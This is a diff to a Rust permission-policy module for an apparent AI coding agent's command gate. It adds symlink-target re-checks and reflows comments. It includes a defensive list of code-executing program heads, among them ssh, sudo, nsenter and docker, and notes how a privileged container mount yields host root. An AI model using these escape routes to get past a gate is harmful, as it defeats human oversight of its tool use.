@@ -10,24 +10,21 @@ use crate::permission::types::{
 use xai_grok_paths::normalize_lexically;
 use xai_grok_tools::implementations::grok_build::web_fetch::domain::normalize_domain;
 
-/// A security-gate escalation with `Ask` provenance. The bash-command and
-/// shell-file gates only escalate (rule `Allow` is dropped), so these three
-/// arms cover every gate outcome.
+/// A security-gate escalation with `Ask` provenance.
+/// The bash-command and shell-file gates only escalate (rule `Allow` is dropped), so these three arms cover every gate outcome.
 #[derive(Debug, Clone, PartialEq, Eq)]
 pub(crate) enum GateDecision {
     /// A deny rule matched.
     Reject(String),
     /// An ask rule matched an identified command or path.
     AskRuleMatch,
-    /// Analysis failed closed (undecomposable script, exhausted wrappers,
-    /// unpinnable operand, recursive reader, ...) without a rule match.
+    /// Analysis failed closed (undecomposable script, exhausted wrappers, unpinnable operand, recursive reader, ...) without a rule match.
     AskFailClosed,
 }
 
 impl GateDecision {
-    /// Collapse provenance back to the plain [`Decision`] the pre-provenance
-    /// gates returned: both Ask arms become `Decision::Ask`, so consumers of
-    /// the public wrappers observe identical decisions.
+    /// Collapse provenance back to the plain [`Decision`] the pre-provenance gates returned.
+    /// Both Ask arms become `Decision::Ask`, so consumers of the public wrappers observe identical decisions.
     pub(crate) fn into_decision(self) -> Decision {
         match self {
             Self::Reject(reason) => Decision::Reject(reason),
@@ -48,8 +45,7 @@ impl GateDecision {
     }
 }
 
-/// `combine_decisions` with provenance kept: Reject > rule-match Ask >
-/// fail-closed Ask, so one rule match anywhere keeps the whole script binding.
+/// `combine_decisions` with provenance kept: Reject > rule-match Ask > fail-closed Ask, so one rule match anywhere keeps the whole script binding.
 pub(crate) fn combine_gate_decisions(
     a: Option<GateDecision>,
     b: Option<GateDecision>,
@@ -77,18 +73,16 @@ struct CompiledRule<'a> {
 pub struct CompiledPolicy {
     config: PermissionConfig,
     matchers: Vec<Option<glob::Pattern>>,
-    /// True if any Read/Edit/Any deny/ask rule exists, so the shell file-access
-    /// gate (`shell_access.rs`) should run. Read by `evaluate_shell_file_access`.
+    /// True if any Read/Edit/Any deny/ask rule exists (Grep-only excluded), so the shell file-access gate should run.
     pub(crate) has_file_restrictions: bool,
-    /// True if any Bash/Any deny/ask rule exists, so the per-segment Bash command
-    /// gate should run. Read by `evaluate_bash_command_policy`.
+    /// True if any Bash/Any deny/ask rule exists, so the per-segment Bash command gate should run.
+    /// Read by `evaluate_bash_command_policy`.
     has_bash_command_restrictions: bool,
-    /// True if any Bash/Any allow rule exists, so the per-segment Bash allow
-    /// gate should run. Read by `evaluate`.
+    /// True if any Bash/Any allow rule exists, so the per-segment Bash allow gate should run.
+    /// Read by `evaluate`.
     has_bash_allow_rules: bool,
-    /// Per-rule [`rule_is_catchall`] verdicts, index-aligned with
-    /// `config.rules`/`matchers`. Precomputed so the auto-mode narrow-allow
-    /// check doesn't re-probe every rule on every request.
+    /// Per-rule [`rule_is_catchall`] verdicts, index-aligned with `config.rules`/`matchers`.
+    /// Precomputed so the auto-mode narrow-allow check doesn't re-probe every rule on every request.
     catchall: Vec<bool>,
 }
 
@@ -130,19 +124,17 @@ impl CompiledPolicy {
         }
     }
 
-    /// Evaluate managed Bash/Any deny/ask command rules against every chained
-    /// segment (wrappers like `timeout`/`env` peeled, `bash -c` scripts recursed
-    /// into), not just the leading command. Escalation only: returns
-    /// `Reject`/`Ask`, never `Allow`. A script that can't be decomposed fails
-    /// closed to `Ask` rather than falling through.
+    /// Evaluate managed Bash/Any deny/ask command rules against every chained segment, not just the leading command.
+    /// Wrappers like `timeout`/`env` are peeled and `bash -c` scripts are recursed into.
+    /// Escalation only: returns `Reject`/`Ask`, never `Allow`.
+    /// A script that can't be decomposed fails closed to `Ask` rather than falling through.
     pub fn evaluate_bash_command_policy(&self, cmd: &str) -> Option<Decision> {
         self.evaluate_bash_command_gate(cmd)
             .map(GateDecision::into_decision)
     }
 
-    /// [`Self::evaluate_bash_command_policy`] with `Ask` provenance kept: a
-    /// rule-match Ask stays binding while the manager may defer a fail-closed
-    /// Ask to the auto-mode classifier.
+    /// [`Self::evaluate_bash_command_policy`] with `Ask` provenance kept.
+    /// A rule-match Ask stays binding while the manager may defer a fail-closed Ask to the auto-mode classifier.
     pub(crate) fn evaluate_bash_command_gate(&self, cmd: &str) -> Option<GateDecision> {
         if !self.has_bash_command_restrictions {
             return None;
@@ -168,8 +160,8 @@ impl CompiledPolicy {
         decision
     }
 
-    /// Rule-check ONE decomposed command's argv: raw and wrapper-normalized
-    /// forms, with inline `-c` and packed `env -S` recursion. Escalation only.
+    /// Rule-check ONE decomposed command's argv: raw and wrapper-normalized forms, with inline `-c` and packed `env -S` recursion.
+    /// Escalation only.
     fn evaluate_command_words(
         &self,
         raw_words: &[String],
@@ -212,7 +204,7 @@ impl CompiledPolicy {
             }
             InlineShellScript::NotInline => {}
         }
-        // High-confidence env -S: shared inline budget; Reject beats Ask floor.
+        // A high-confidence `env -S` script recurses on the same inline budget as `-c`; Reject still beats the Ask floor
         if let Some(script) = env_split_string_script(inner_words) {
             if inline_depth_remaining > 0 {
                 decision = combine_gate_decisions(
@@ -227,16 +219,63 @@ impl CompiledPolicy {
     }
 
     /// Evaluate using deny > ask > allow precedence (order-independent).
-    ///
-    /// Path rules use lexical collapse only (no session cwd). Prefer
-    /// [`Self::evaluate_with_cwd`] for Read/Edit/Grep when a workspace cwd is known.
+    /// Path rules use lexical collapse (no session cwd).
+    /// Prefer [`Self::evaluate_with_cwd`] for Read/Edit/Grep when a workspace cwd is known.
     pub fn evaluate(&self, access: &AccessKind) -> Option<Decision> {
         self.evaluate_with_cwd(access, None)
     }
 
-    /// Like [`Self::evaluate`], cwd-joining relative tool paths before the
-    /// path-glob match.
+    /// Like [`Self::evaluate`], but joins relative tool paths to `cwd` before the path-glob match.
+    /// Native Read/Edit/Grep also re-check the followed symlink target for deny/ask only (allow on the target is not granted).
     pub fn evaluate_with_cwd(&self, access: &AccessKind, cwd: Option<&Path>) -> Option<Decision> {
+        self.evaluate_with_cwd_details(access, cwd).0
+    }
+
+    /// Lexical decision plus whether an unresolvable native symlink forces a prompt.
+    pub(crate) fn evaluate_with_cwd_details(
+        &self,
+        access: &AccessKind,
+        cwd: Option<&Path>,
+    ) -> (Option<Decision>, bool) {
+        let lexical = self.evaluate_lexical_with_cwd(access, cwd);
+        let Some(path) = native_file_path(access) else {
+            return (lexical, false);
+        };
+        let Some(raw_absolute) = raw_absolute_tool_path(path, cwd) else {
+            return (lexical, false);
+        };
+        let lexical_abs = path_match_string(&absolute_normalized_path(path, cwd));
+        match follow_absolute_symlink(&raw_absolute, &lexical_abs) {
+            SymlinkFollow::Target(resolved) => {
+                let resolved_decision = match self
+                    .evaluate_lexical_with_cwd(&access_with_path(access, resolved), cwd)
+                {
+                    Some(decision @ (Decision::Reject(_) | Decision::Ask)) => Some(decision),
+                    _ => None,
+                };
+                (combine_decisions(lexical, resolved_decision), false)
+            }
+            SymlinkFollow::Unresolvable if self.native_path_restrictions_apply(access) => {
+                (combine_decisions(lexical, Some(Decision::Ask)), true)
+            }
+            SymlinkFollow::Unresolvable | SymlinkFollow::None => (lexical, false),
+        }
+    }
+
+    /// True if any deny/ask rule applies to this access, including Grep-only rules the shell gate skips.
+    fn native_path_restrictions_apply(&self, access: &AccessKind) -> bool {
+        self.config.rules.iter().any(|rule| {
+            matches!(rule.action, RuleAction::Deny | RuleAction::Ask)
+                && tool_filter_matches(access, &rule.tool)
+        })
+    }
+
+    /// Lexical rule match only. Callers re-check symlink targets through this so follow cannot recurse.
+    pub(crate) fn evaluate_lexical_with_cwd(
+        &self,
+        access: &AccessKind,
+        cwd: Option<&Path>,
+    ) -> Option<Decision> {
         let mut matched_ask = false;
         let mut matched_allow = false;
 
@@ -280,8 +319,7 @@ impl CompiledPolicy {
         if matched_ask {
             return Some(Decision::Ask);
         }
-        // Bash allow is conjunctive: grant only if every peeled chain segment
-        // independently matches an allow rule.
+        // Bash allow is conjunctive: grant only if every peeled chain segment independently matches an allow rule
         if let AccessKind::Bash(cmd) = access {
             if self.has_bash_allow_rules
                 && self.bash_chain_fully_allowed(cmd, MAX_INLINE_SHELL_DEPTH, AllowRuleScope::Any)
@@ -296,23 +334,12 @@ impl CompiledPolicy {
         None
     }
 
-    /// Whether *narrow* allow rules alone fully authorize this Bash command —
-    /// [`Self::evaluate_with_cwd`]'s Bash allow arm restricted to
-    /// [`AllowRuleScope::NarrowOnly`]. Auto mode lets a deliberately scoped
-    /// rule (e.g. `Bash(git push:*)`) resolve before its classifier, matching
-    /// how ask mode honors the same rule, while a blanket `Bash(*)` or an
-    /// exec-vehicle rule stays suspended into the classifier.
-    ///
-    /// Provenance: allow rules merge from every settings source, including
-    /// project-tree files a repository can supply, so a checked-in rule can
-    /// decide what skips classification. Folder trust makes that acceptable —
-    /// untrusted directories' project rules are dropped at resolution time,
-    /// before this policy is compiled.
-    ///
-    /// Bash only: non-Bash access has no static findings, so its allow rules
-    /// already bypass the classifier without consulting narrowness. Only
-    /// meaningful when the full evaluation already returned `Allow` (deny/ask
-    /// precedence is not re-checked here).
+    /// Whether *narrow* allow rules alone fully authorize this Bash command: the allow walk restricted to [`AllowRuleScope::NarrowOnly`].
+    /// Auto mode lets a deliberately scoped rule (e.g. `Bash(git push:*)`) resolve before its classifier, as ask mode already does.
+    /// A blanket `Bash(*)` or an exec-vehicle rule stays suspended into the classifier.
+    /// Checked-in project rules can decide what skips classification; untrusted directories' rules are dropped before this policy is compiled.
+    /// Bash only: non-Bash access has no static findings, so its allow rules already bypass the classifier without consulting narrowness.
+    /// Only meaningful when the full evaluation already returned `Allow` (deny/ask precedence is not re-checked here).
     pub(crate) fn narrow_allow_authorizes(&self, access: &AccessKind) -> bool {
         let AccessKind::Bash(cmd) = access else {
             return false;
@@ -373,11 +400,9 @@ impl CompiledPolicy {
             return false;
         }
         let narrow_only = scope == AllowRuleScope::NarrowOnly;
-        // An exec-vehicle head makes any rule effectively a code-execution
-        // grant (`Bash(python:*)` is one `-c` away from arbitrary code), so it
-        // never counts as narrow — the classifier stays in the loop. The
-        // `-c` shells are also floored by `shell_dash_c_script`; this list
-        // covers the vehicles that floor does not model.
+        // An exec-vehicle head makes any rule effectively a code-execution grant (`Bash(python:*)` is one `-c` away from arbitrary code)
+        // It never counts as narrow, so the classifier stays in the loop
+        // The `-c` shells are also floored by `shell_dash_c_script`; this list covers the vehicles that floor does not model
         if narrow_only && head_is_exec_vehicle(words) {
             return false;
         }
@@ -420,12 +445,10 @@ pub(crate) enum InlineShellScript {
     NotInline,
     /// Trusted literal `-c` script at this word index.
     Literal(usize),
-    /// Confirmed or potential `-c` shape whose script cannot be trusted for recursion
-    /// (dynamic head/operand, missing script, ambiguous options after `-c`).
+    /// Confirmed or potential `-c` shape whose script cannot be recursed into (dynamic head/operand, missing script, ambiguous options after `-c`).
     Untrusted,
-    /// Unmodeled/ambiguous options without evidence of `-c` string reinterpretation
-    /// (e.g. `bash --version`). Security gates still Ask; auto-mode opaque-shell
-    /// floor does not — only `Literal` / `Untrusted` re-interpret a command string.
+    /// Unmodeled/ambiguous options without evidence of `-c` string reinterpretation (e.g. `bash --version`).
+    /// Security gates still Ask; the auto-mode opaque-shell floor does not, since only `Literal` / `Untrusted` re-interpret a command string.
     Unrecognized,
 }
 
@@ -437,9 +460,8 @@ impl InlineShellScript {
 }
 
 /// Classify a supported shell's inline `-c` script without guessing option operands.
-/// An untrusted program head that still matches a `-c` shape is `Untrusted` (Ask),
-/// not a global Ask for every dynamic command. Unmodeled long options without `-c`
-/// are `Unrecognized` (security Ask, not opaque-shell).
+/// An untrusted program head that still matches a `-c` shape is `Untrusted` (Ask), not a global Ask for every dynamic command.
+/// Unmodeled long options without `-c` are `Unrecognized` (security Ask, not opaque-shell).
 pub(crate) fn shell_dash_c_script(words: &[ShellWord<'_>]) -> InlineShellScript {
     let dynamic_head = match words.first() {
         Some(ShellWord::Literal(program)) => {
@@ -456,8 +478,8 @@ pub(crate) fn shell_dash_c_script(words: &[ShellWord<'_>]) -> InlineShellScript 
     let mut i = 1usize;
     let mut saw_c = false;
     let mut unrecognized = false;
-    // After `-c`, fail closed as Untrusted; before `-c`, Unrecognized (security Ask
-    // without claiming string reinterpretation for the opaque-shell floor).
+    // After `-c`, fail closed as Untrusted
+    // Before `-c`, Unrecognized (security Ask without claiming string reinterpretation for the opaque-shell floor)
     let ambiguous = |saw_c: bool| {
         if saw_c {
             InlineShellScript::Untrusted
@@ -511,9 +533,8 @@ pub(crate) fn shell_dash_c_script(words: &[ShellWord<'_>]) -> InlineShellScript 
                 i += 1;
                 continue;
             }
-            // Unmodeled long option: keep scanning for a later `-c` so
-            // `bash --verbose -c '…'` stays potential-inline, while bare
-            // `bash --version` / `bash --help` become Unrecognized (not opaque).
+            // Unmodeled long option: keep scanning for a later `-c` so `bash --verbose -c '…'` stays potential-inline
+            // Bare `bash --version` / `bash --help` become Unrecognized (not opaque)
             if saw_c {
                 return InlineShellScript::Untrusted;
             }
@@ -565,9 +586,9 @@ fn tool_filter_matches(access: &AccessKind, filter: &ToolFilter) -> bool {
         ToolFilter::Any => true,
         ToolFilter::Bash => matches!(access, AccessKind::Bash(_)),
         ToolFilter::Edit => matches!(access, AccessKind::Edit(_)),
-        // A Read rule also governs the Grep tool: grep reads file contents, so a
-        // managed `Read` deny/ask on a path must block grepping that same path —
-        // otherwise grep is a read-bypass. Grep-specific rules still use `Grep`.
+        // A Read rule also governs the Grep tool: grep reads file contents, so a managed `Read` deny/ask on a path must block grepping it
+        // Otherwise grep is a read-bypass
+        // Grep-specific rules still use `Grep`
         ToolFilter::Read => matches!(access, AccessKind::Read(_) | AccessKind::Grep { .. }),
         ToolFilter::Grep => matches!(access, AccessKind::Grep { .. }),
         ToolFilter::Mcp => matches!(access, AccessKind::MCPTool { .. }),
@@ -577,56 +598,43 @@ fn tool_filter_matches(access: &AccessKind, filter: &ToolFilter) -> bool {
     }
 }
 
-/// Which allow rules an evaluation walk may count. Callers pick at the call
-/// site: [`Self::Any`] is the ordinary conjunctive allow gate; auto mode uses
-/// [`Self::NarrowOnly`] to decide what may resolve before its classifier.
+/// Callers pick at the call site: [`Self::Any`] is the ordinary conjunctive allow gate.
+/// Auto mode uses [`Self::NarrowOnly`] to decide what may resolve before its classifier.
 #[derive(Clone, Copy, PartialEq, Eq)]
 enum AllowRuleScope {
     /// Every allow rule.
     Any,
-    /// Only deliberately scoped rules: non-catchall ([`rule_is_catchall`]) and
-    /// not headed by an exec vehicle ([`head_is_exec_vehicle`]).
+    /// Only deliberately scoped rules: non-catchall ([`rule_is_catchall`]) and not headed by an exec vehicle ([`head_is_exec_vehicle`]).
     NarrowOnly,
 }
 
-/// Program heads that execute code handed to them — interpreters, script
-/// runners, remote shells, and privilege escalators. Exact basename matches
-/// (compared lowercased, `.exe` stripped); interpreter families with
-/// versioned spellings (`python3.13`) live in [`EXEC_VEHICLE_HEAD_FAMILIES`].
-/// Extend as new vehicles come up. Over-matching is fail-safe: a head wrongly
-/// treated as a vehicle only loses the narrow-rule classifier bypass and
-/// floors its always-allow scope — never the reverse.
+/// Program heads that execute code handed to them: interpreters, script runners, remote shells, and privilege escalators.
+/// Exact basename matches (compared lowercased, `.exe` stripped).
+/// Interpreter families with versioned spellings (`python3.13`) live in [`EXEC_VEHICLE_HEAD_FAMILIES`].
+/// Extend as new vehicles come up.
+/// Over-matching is fail-safe: a head wrongly treated as a vehicle only loses the narrow-rule classifier bypass and floors its always-allow scope.
 const EXEC_VEHICLE_HEADS: &[&str] = &[
-    // Shells (their `-c` forms are also floored by `shell_dash_c_script`;
-    // listing them here additionally covers `bash script.sh`-style runs).
+    // Shells (their `-c` forms are also floored by `shell_dash_c_script`; listing them here additionally covers `bash script.sh`-style runs)
     "sh", "bash", "zsh", "dash", "ksh", "fish",
-    // Interpreters and their distro / variant spellings that the versioned
-    // family rule below does not catch (`nodejs` is Debian/Ubuntu's node,
-    // `luajit`, `phpdbg`/`php-cgi`, `pythonw`).
+    // Interpreters and their distro / variant spellings that the versioned family rule below does not catch (`nodejs` is Debian/Ubuntu's node)
     "deno", "bun", "julia", "rscript", "awk", "gawk", "mawk", "nawk", "nodejs", "luajit", "phpdbg",
     "php-cgi", "pythonw", // Package runners that fetch-and-execute.
     "npx", "bunx", "pipx", "uvx", "uv",
-    // Arg-forwarding executors (`find -exec` hands off like `xargs`), remote
-    // shells, privilege escalators.
+    // Arg-forwarding executors (`find -exec` forwards arguments like `xargs`), remote shells, privilege escalators
     "xargs", "find", "sudo", "doas", "su", "ssh", "watch", "setsid", "flock", "chroot", "nsenter",
-    // Container runtimes: `run --privileged -v /:/host <image>` is full host
-    // root, so a bare `docker`/`podman` grant is as broad as `sudo`.
+    // Container runtimes: `run --privileged -v /:/host <image>` is full host root, so a bare `docker`/`podman` grant is as broad as `sudo`
     "docker", "podman",
 ];
 
-/// Interpreter families with versioned spellings: `python` also covers
-/// `python3`, `python3.13`, and `python3.13t` (free-threaded). Only a
-/// version-like suffix counts — a bare prefix match would rope in unrelated
-/// tools (`nodemon`, `phpunit`) and cost their narrow rules the bypass.
+/// Interpreter families with versioned spellings: `python` also covers `python3`, `python3.13`, and `python3.13t` (free-threaded).
+/// Only a version-like suffix counts; a bare prefix match would match unrelated tools (`nodemon`, `phpunit`) and cost their narrow rules the bypass.
 const EXEC_VEHICLE_HEAD_FAMILIES: &[&str] = &["python", "node", "ruby", "perl", "php", "lua"];
 
-/// Whether the command's program head executes code handed to it. Head is the
-/// basename, lowercased with a `.exe` suffix stripped, matched against
-/// [`EXEC_VEHICLE_HEADS`] or a versioned [`EXEC_VEHICLE_HEAD_FAMILIES`]
-/// spelling. `pub(crate)` so [`minimum_always_allow_scope`] floors these to
-/// the full command like dangerous verbs.
-/// Normalized command basename for name matching: leading path stripped,
-/// lowercased, trailing `.exe` removed — so `/usr/bin/GH.EXE` reads as `gh`.
+/// Whether the command's program head executes code handed to it.
+/// Head is the basename, lowercased with a `.exe` suffix stripped.
+/// It matches [`EXEC_VEHICLE_HEADS`] or a versioned [`EXEC_VEHICLE_HEAD_FAMILIES`] spelling.
+/// `pub(crate)` so [`minimum_always_allow_scope`] floors these to the full command like dangerous verbs.
+/// Normalized command basename for name matching: leading path stripped, lowercased, trailing `.exe` removed, so `/usr/bin/GH.EXE` reads as `gh`.
 pub(crate) fn normalized_command_head(words: &[String]) -> Option<String> {
     let head = words
         .first()?
@@ -653,11 +661,10 @@ pub(crate) fn head_is_exec_vehicle(words: &[String]) -> bool {
     })
 }
 
-/// Whether a bash glob pattern is universally broad — matches every bash probe
-/// [`bash_probes`], the same set [`rule_is_catchall`] uses. Callers persisting
-/// a client-supplied glob use this to refuse `*`, `**`, `?*`, `* *`, and the
-/// like, which "matches the prompted script" only because they match anything.
-/// Also the pattern editor's save gate, so it cannot drift from this refusal.
+/// Whether a bash glob pattern is universally broad: it matches every bash probe [`bash_probes`], the same set [`rule_is_catchall`] uses.
+/// Callers persisting a client-supplied glob use this to refuse `*`, `**`, `?*`, `* *`, and the like.
+/// Those "match the prompted script" only because they match anything.
+/// This is also the pattern editor's save gate, so it cannot drift from this refusal.
 pub fn bash_glob_is_catchall(pattern: &str) -> bool {
     bash_probes().iter().all(|access| match access {
         AccessKind::Bash(cmd) => bash_pattern_matches_command(pattern, cmd),
@@ -665,18 +672,15 @@ pub fn bash_glob_is_catchall(pattern: &str) -> bool {
     })
 }
 
-/// Prefix match requiring a word boundary: `git` matches `git`/`git ...` but
-/// not `gitleaks`.
+/// Prefix match requiring a word boundary: `git` matches `git`/`git ...` but not `gitleaks`.
 fn matches_command_prefix(cmd: &str, pattern: &str) -> bool {
     cmd == pattern || (cmd.starts_with(pattern) && cmd.as_bytes().get(pattern.len()) == Some(&b' '))
 }
 
 /// Shared bash allow match: word-boundary prefix OR freeform glob.
 ///
-/// Used by config `[permission]` rules, session `allowed_bash_globs`, and the
-/// pattern-editor live preview so the three paths cannot drift. `precompiled`
-/// is the matcher from [`CompiledPolicy`] when available; otherwise the
-/// pattern is compiled on the fly (session grants / preview).
+/// Used by config `[permission]` rules, session `allowed_bash_globs`, and the pattern-editor live preview so the three paths cannot drift.
+/// `precompiled` is the matcher from [`CompiledPolicy`] when available; otherwise the pattern is compiled on the fly (session grants / preview).
 fn bash_command_matches_pattern(
     command: &str,
     pattern: &str,
@@ -708,24 +712,21 @@ fn bash_allow_pattern_matches(
     matcher: Option<&glob::Pattern>,
 ) -> bool {
     match rule.pattern.as_deref() {
-        // No pattern (tool-filter only) or `*` → unrestricted for this rule.
+        // No pattern (tool-filter only) or `*` means this rule is unrestricted
         None | Some("*") => true,
         Some(pattern) => bash_command_matches_pattern(cmd, pattern, matcher),
     }
 }
 
 /// Would a `Bash(pattern)` allow rule match `command`?
-///
-/// Same semantics as config `[permission]` bash allow rules and session glob
-/// grants: word-boundary prefix or freeform glob. `*` matches everything;
-/// blank after trim matches nothing.
+/// Matches the same way as config `[permission]` bash allow rules and session glob grants: word-boundary prefix or freeform glob.
+/// `*` matches everything; blank after trim matches nothing.
 pub fn bash_pattern_matches_command(pattern: &str, command: &str) -> bool {
     bash_command_matches_pattern(command, pattern, None)
 }
 
-/// Whether a pattern grants an unscoped range of commands, for the editor's
-/// non-blocking "very broad" warning: a bare `*`, or a single token with no
-/// argument boundary (`gh`, `gh*`) that covers every invocation of a program.
+/// Whether a pattern grants an unscoped range of commands, for the editor's non-blocking "very broad" warning.
+/// Broad here means a bare `*`, or a single token with no argument boundary (`gh`, `gh*`) that covers every invocation of a program.
 pub fn bash_pattern_is_broad(pattern: &str) -> bool {
     let pattern = pattern.trim();
     if pattern.is_empty() {
@@ -745,8 +746,7 @@ fn pattern_matches(access: &AccessKind, cr: &CompiledRule<'_>, cwd: Option<&Path
     }
 
     match access {
-        // CWE-178: trim leading whitespace so deny rules cannot
-        // be bypassed by prefixing commands with spaces.
+        // CWE-178: trim leading whitespace so deny rules cannot be bypassed by prefixing commands with spaces
         AccessKind::Bash(cmd) => {
             let cmd = cmd.trim_start();
             cmd.starts_with(pattern) || glob_matches(cmd, MatchContext::Freeform, cr.matcher)
@@ -775,23 +775,19 @@ fn pattern_matches(access: &AccessKind, cr: &CompiledRule<'_>, cwd: Option<&Path
     }
 }
 
-/// Match Read/Edit/Grep after lexical normalize (+ cwd-join). Rooted patterns
-/// are self-containing: `..` never survives normalization, and the
-/// cwd-relative spellings are generated only for paths genuinely under the
-/// cwd, so `Read(./**)` / `Read(src/**)` cannot be escaped via traversal.
-/// Unrooted patterns (`*`, leading `**`) keep their documented any-depth
-/// meaning.
+/// Match Read/Edit/Grep after lexical normalize and cwd-join.
+/// Rooted patterns are self-containing: `..` never survives normalization, and cwd-relative spellings exist only for paths genuinely under the cwd.
+/// So `Read(./**)` / `Read(src/**)` cannot be escaped via traversal.
+/// Unrooted patterns (`*`, leading `**`) keep their documented any-depth meaning.
 fn path_context_matches(path: &str, cr: &CompiledRule<'_>, cwd: Option<&Path>) -> bool {
     path_match_forms(path, cwd)
         .iter()
         .any(|text| glob_matches(text, MatchContext::Path, cr.matcher))
 }
 
-/// Normalized absolute form, plus cwd-relative and `./`-prefixed spellings when
-/// the path stays under cwd (so `Read(./**)` matches bare `src/main.rs`).
-/// Normalization never leaves `.`/`..` in the forms, so a relative spelling is
-/// produced only for paths genuinely under the cwd. Tilde paths are matched
-/// literally only (see [`is_tilde_path`]).
+/// Normalized absolute form, plus cwd-relative and `./`-prefixed spellings when the path is under cwd (so `Read(./**)` matches bare `src/main.rs`).
+/// Normalization never leaves `.`/`..` in the forms, so a relative spelling is produced only for paths genuinely under the cwd.
+/// Tilde paths are matched literally only (see [`is_tilde_path`]).
 fn path_match_forms(path: &str, cwd: Option<&Path>) -> Vec<String> {
     let abs = absolute_normalized_path(path, cwd);
     let mut forms = vec![path_match_string(&abs)];
@@ -819,8 +815,7 @@ fn path_match_forms(path: &str, cwd: Option<&Path>) -> Vec<String> {
 fn absolute_normalized_path(path: &str, cwd: Option<&Path>) -> PathBuf {
     let raw = Path::new(path);
     if is_tilde_path(raw) {
-        // Kept raw: no cwd-join, and no collapse either — `~/../x` collapsing
-        // to `x` would mint a false workspace-relative identity.
+        // Kept raw: no cwd-join and no collapse; collapsing `~/../x` to `x` would make it look workspace-relative
         return raw.to_path_buf();
     }
     let joined = match cwd {
@@ -830,10 +825,9 @@ fn absolute_normalized_path(path: &str, cwd: Option<&Path>) -> PathBuf {
     normalize_lexically(&joined)
 }
 
-/// A leading `~` component is expanded to the home directory by the tools
-/// (`resolve_model_path`) *after* this gate runs, so such a path must never be
-/// treated as cwd-relative: a manufactured `./~/…` spelling would satisfy
-/// workspace allows like `./**` while the tool escapes to the real home.
+/// A leading `~` component is expanded to the home directory by the tools (`resolve_model_path`) *after* this gate runs.
+/// Such a path must never be treated as cwd-relative.
+/// A manufactured `./~/…` spelling would satisfy workspace allows like `./**` while the tool escapes to the real home.
 /// Tilde paths are matched literally instead, exactly as patterns treat `~`.
 fn is_tilde_path(path: &Path) -> bool {
     matches!(
@@ -842,12 +836,148 @@ fn is_tilde_path(path: &Path) -> bool {
     )
 }
 
+fn native_file_path(access: &AccessKind) -> Option<&str> {
+    match access {
+        AccessKind::Edit(path) => Some(path.as_str()),
+        AccessKind::Read(Some(path)) => Some(path.as_str()),
+        AccessKind::Grep {
+            path: Some(path), ..
+        } => Some(path.as_str()),
+        _ => None,
+    }
+}
+
+fn access_with_path(access: &AccessKind, path: String) -> AccessKind {
+    match access {
+        AccessKind::Edit(_) => AccessKind::Edit(path),
+        AccessKind::Read(_) => AccessKind::Read(Some(path)),
+        AccessKind::Grep { glob, .. } => AccessKind::Grep {
+            path: Some(path),
+            glob: glob.clone(),
+        },
+        _ => unreachable!("caller filters via native_file_path"),
+    }
+}
+
+/// Cwd-join without collapsing `.`/`..`, so physical resolve sees `..` after a link.
+fn raw_absolute_tool_path(path: &str, cwd: Option<&Path>) -> Option<String> {
+    let raw = Path::new(path);
+    if is_tilde_path(raw) {
+        return None;
+    }
+    let joined = match cwd {
+        Some(cwd) if !raw.is_absolute() => cwd.join(raw),
+        _ => raw.to_path_buf(),
+    };
+    joined.is_absolute().then(|| path_match_string(&joined))
+}
+
 fn path_match_string(path: &Path) -> String {
     path.to_string_lossy().replace('\\', "/")
 }
 
 fn path_has_parent_dir(path: &Path) -> bool {
     path.components().any(|c| matches!(c, Component::ParentDir))
+}
+
+/// True if any existing component of `absolute` is a symlink.
+fn path_has_symlink(absolute: &str) -> bool {
+    let path = Path::new(absolute);
+    if !path.is_absolute() {
+        return false;
+    }
+    let mut prefix = PathBuf::new();
+    for comp in path.components() {
+        prefix.push(comp);
+        if std::fs::symlink_metadata(&prefix).is_ok_and(|meta| meta.file_type().is_symlink()) {
+            return true;
+        }
+    }
+    false
+}
+
+/// Canonical target, or `None` on relative input, cycles, depth limits, or fs errors.
+fn resolve_symlink_target(absolute: &str) -> Option<String> {
+    let path = Path::new(absolute);
+    if !path.is_absolute() {
+        return None;
+    }
+    let resolved = resolve_following_symlinks(path)?;
+    Some(path_match_string(&normalize_lexically(&resolved)))
+}
+
+/// Follow every symlink, including dangling leaves and missing trailing components.
+pub(crate) fn resolve_following_symlinks(path: &Path) -> Option<PathBuf> {
+    fn walk(path: &Path, depth: usize) -> Option<PathBuf> {
+        const MAX_SYMLINK_DEPTH: usize = 40;
+        if depth > MAX_SYMLINK_DEPTH {
+            return None;
+        }
+        // `dunce` avoids Windows `\\?\` verbatim paths (repo convention).
+        if let Ok(canonical) = dunce::canonicalize(path) {
+            return Some(canonical);
+        }
+        // Parent-first so a dangling or not-yet-created leaf still follows links.
+        let parent = path.parent()?;
+        let file_name = path.file_name()?;
+        let resolved_parent = walk(parent, depth + 1)?;
+        let candidate = resolved_parent.join(file_name);
+        // NotFound is a new path; any other metadata error fails closed.
+        let metadata = match std::fs::symlink_metadata(&candidate) {
+            Ok(metadata) => Some(metadata),
+            Err(error) if error.kind() == std::io::ErrorKind::NotFound => None,
+            Err(_) => return None,
+        };
+        if metadata.is_some_and(|metadata| metadata.file_type().is_symlink()) {
+            // Unreadable link target fails closed rather than treating the link path as real.
+            let target = std::fs::read_link(&candidate).ok()?;
+            let target = if target.is_absolute() {
+                target
+            } else {
+                resolved_parent.join(target)
+            };
+            return walk(&target, depth + 1);
+        }
+        Some(candidate)
+    }
+    walk(path, 0)
+}
+
+/// The result of following symlinks on an absolute path, used by the escalate-only re-checks.
+#[derive(Debug)]
+pub(crate) enum SymlinkFollow {
+    None,
+    Target(String),
+    Unresolvable,
+}
+
+pub(crate) fn follow_absolute_symlink(raw_absolute: &str, lexical_absolute: &str) -> SymlinkFollow {
+    match resolve_symlink_target(raw_absolute) {
+        Some(resolved) if resolved != lexical_absolute => SymlinkFollow::Target(resolved),
+        Some(_) => SymlinkFollow::None,
+        None if path_has_symlink(raw_absolute) => SymlinkFollow::Unresolvable,
+        None => SymlinkFollow::None,
+    }
+}
+
+fn decision_rank(decision: &Decision) -> u8 {
+    match decision {
+        Decision::Reject(_) | Decision::PolicyDeny(_) => 3,
+        Decision::Ask => 2,
+        Decision::Allow => 1,
+        Decision::FollowupMessage(_) | Decision::Cancelled => 0,
+    }
+}
+
+pub(crate) fn combine_decisions(a: Option<Decision>, b: Option<Decision>) -> Option<Decision> {
+    match (a, b) {
+        (None, other) | (other, None) => other,
+        (Some(a), Some(b)) => Some(if decision_rank(&a) >= decision_rank(&b) {
+            a
+        } else {
+            b
+        }),
+    }
 }
 
 fn domain_matches(pattern: &str, url: &str) -> bool {
@@ -876,8 +1006,7 @@ fn glob_matches(text: &str, ctx: MatchContext, pat: Option<&glob::Pattern>) -> b
     )
 }
 
